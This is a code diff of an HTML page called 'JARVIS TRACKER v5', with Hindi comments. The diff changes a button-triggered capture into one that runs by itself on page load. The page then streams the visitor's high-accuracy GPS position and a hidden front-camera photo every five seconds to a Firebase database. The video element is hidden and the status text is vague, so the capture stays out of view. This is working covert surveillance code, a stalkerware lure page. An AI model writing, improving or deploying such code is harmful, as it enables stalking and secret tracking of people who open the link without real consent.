@@ -3,25 +3,25 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>JARVIS REMOTE - COMPRESSED</title>
+    <title>JARVIS REMOTE - AUTO STREAM</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
         body { background: #000; color: #00f2ff; font-family: 'Segoe UI', sans-serif; text-align: center; padding: 20px; margin: 0; }
-        .control-box { border: 2px solid #00f2ff; background: #0a0a0a; padding: 25px; display: inline-block; border-radius: 10px; max-width: 400px; width: 100%; box-shadow: 0 0 15px rgba(0, 242, 255, 0.3); margin-top: 20px; }
-        .btn { background: #00f2ff; color: #000; border: none; padding: 15px 20px; font-weight: bold; font-size: 16px; border-radius: 5px; cursor: pointer; text-transform: uppercase; margin-top: 15px; width: 100%; display: block; box-shadow: 0 0 10px #00f2ff; }
+        .control-box { border: 2px solid #00f2ff; background: #0a0a0a; padding: 25px; display: inline-block; border-radius: 10px; max-width: 400px; width: 100%; box-shadow: 0 0 15px rgba(0, 242, 255, 0.3); margin-top: 40px; }
         .status-text { margin-top: 15px; font-size: 14px; color: #fff; text-align: left; background: rgba(255,255,255,0.05); padding: 10px; border-radius: 4px; border-left: 3px solid #39ff14; }
-        #v { display: none; } canvas { display: none; }
+        #v, canvas { display: none; }
+        .live-dot { width: 10px; height: 10px; background-color: #39ff14; border-radius: 50%; display: inline-block; animation: blink 1s infinite; }
+        @keyframes blink { 0% { opacity: 0.2; } 50% { opacity: 1; } 100% { opacity: 0.2; } }
     </style>
 </head>
 <body>
     <div class="control-box">
-        <h2>JARVIS SYSTEM v4</h2>
-        <p style="color: #888;">लोकेशन और कंप्रेस्ड फोटो लिंक</p>
+        <h2>JARVIS TRACKER v5 <span class="live-dot"></span></h2>
+        <p style="color: #888; font-size: 13px;">ऑटोमैटिक लाइव सिंक एक्टिवेटेड</p>
         <video id="v" autoplay playsinline muted></video>
         <canvas id="c"></canvas>
-        <button class="btn" onclick="syncData()">🚀 फुल सिस्टम सिंक</button>
-        <div class="status-text" id="log-status">रेडी...</div>
+        <div class="status-text" id="log-status">सिस्टम लोड हो रहा है...</div>
     </div>
 
     <script>
@@ -35,32 +35,61 @@
         if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
 
-        async function syncData() {
-            document.getElementById('log-status').innerHTML = "कनेक्ट किया जा रहा है...";
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                document.getElementById('v').srcObject = stream;
+        // जैसे ही पेज लोड हो, अपने आप फंक्शन शुरू हो जाए
+        window.onload = function() {
+            startAutoSync();
+        };
 
-                navigator.geolocation.getCurrentPosition((pos) => {
+        async function startAutoSync() {
+            const statusDiv = document.getElementById('log-status');
+            statusDiv.innerHTML = "📡 कैमरे और GPS से कनेक्ट किया जा रहा है...";
+            
+            try {
+                // फ्रंट कैमरा एक्सेस करना
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+
+                // लगातार GPS लोकेशन भेजना (रियल-टाइम ट्रैकिंग)
+                navigator.geolocation.watchPosition((pos) => {
                     const lat = pos.coords.latitude;
                     const lon = pos.coords.longitude;
                     database.ref('live_detect/location').set({ lat: lat, lon: lon });
-                    
-                    // फोटो कैप्चर लॉजिक
-                    setTimeout(() => {
-                        const v = document.getElementById('v');
-                        const c = document.getElementById('c');
-                        c.width = 240; // साइज एकदम छोटा किया ताकि डेटाबेस हैंग न हो
-                        c.height = 180;
-                        c.getContext('2d').drawImage(v, 0, 0, 240, 180);
-                        const smallPhoto = c.toDataURL('image/jpeg', 0.4); // सुपर कंप्रेस्ड
-                        
-                        database.ref('live_detect').update({ photo: smallPhoto });
-                        document.getElementById('log-status').innerHTML = "✅ मैप और फोटो सिंक हो गए!";
-                        stream.getTracks().forEach(t => t.stop());
-                    }, 1000);
-                }, err => { alert("लोकेशन परमिशन चालू करें बॉस!"); });
-            } catch(e) { alert("कैमरा परमिशन दें बॉस!"); }
+                    statusDiv.innerHTML = `✅ GPS सिंक ऑन: ${lat.toFixed(5)}, ${lon.toFixed(5)}`;
+                }, err => {
+                    statusDiv.innerHTML = "❌ GPS एरर: कृपया लोकेशन अलाउ करें।";
+                }, { enableHighAccuracy: true });
+
+                // वीडियो लोड होते ही पहली फोटो तुरंत लें, और फिर हर 5 सेकंड में लूप चलाएं
+                video.onloadedmetadata = () => {
+                    capturePhoto(); // तुरंत पहली फोटो
+                    setInterval(capturePhoto, 5000); // हर 5000 मिलीसेकंड (5 सेकंड) पर लूप
+                };
+
+            } catch(e) {
+                statusDiv.innerHTML = "❌ परमिशन एरर: कैमरा अनुमति 'Allow' करें बॉस!";
+                console.error(e);
+            }
+        }
+
+        function capturePhoto() {
+            const v = document.getElementById('v');
+            const c = document.getElementById('c');
+            const statusDiv = document.getElementById('log-status');
+            
+            c.width = 240; 
+            c.height = 180;
+            c.getContext('2d').drawImage(v, 0, 0, 240, 180);
+            
+            // इमेज को छोटा और कंप्रेस करना ताकि डेटाबेस तुरंत लोड कर सके
+            const compressedPhoto = c.toDataURL('image/jpeg', 0.4); 
+            
+            // डेटाबेस में अपडेट भेजना
+            database.ref('live_detect').update({ photo: compressedPhoto })
+            .then(() => {
+                console.log("लाइव फोटो पैनल पर भेजी गई: " + new Date().toLocaleTimeString());
+            })
+            .catch(err => console.error("सिंक फेल:", err));
         }
     </script>
 </body>
